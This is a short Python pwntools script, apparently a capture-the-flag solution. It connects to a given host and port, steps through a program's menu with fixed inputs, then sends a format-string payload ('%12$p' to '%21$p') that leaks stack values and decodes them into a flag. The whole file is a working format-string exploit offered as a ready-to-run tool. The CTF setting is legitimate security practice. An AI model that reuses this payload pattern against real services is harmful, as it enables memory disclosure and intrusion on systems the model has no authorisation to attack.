#!/home/kali/tools-from-git/pypawn/bin/python3

import pwn
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="Hostname or IP")
parser.add_argument("port", type=str, help="Port")

args = parser.parse_args()

payload=b"%12$p%13$p%14$p%15$p%16$p%17$p%18$p%19$p%20$p%21$p"
flag = []

def decode(encodedFlag):
    for element in encodedFlag.split("0x")[1:]:
        flag.append(pwn.p32(int("0x"+element,16)))

#connect
process=pwn.remote(args.host, args.port)

#Pre exploit
process.recv().decode("utf-8")
process.sendline(b"test")
process.recv().decode("utf-8")
process.sendline(b"t3st")
process.recv().decode("utf-8")
process.sendline(b"2")
process.recv().decode("utf-8")
process.sendline(b"1")
process.recv().decode("utf-8")
process.sendline(b"2")

#exploit
print(process.recv().decode("utf-8"))
process.sendline(payload)

encodedFlag = process.recv().decode("utf-8")

#decode
print(encodedFlag)
decode(encodedFlag)
print(b''.join(flag).decode("utf-8"))

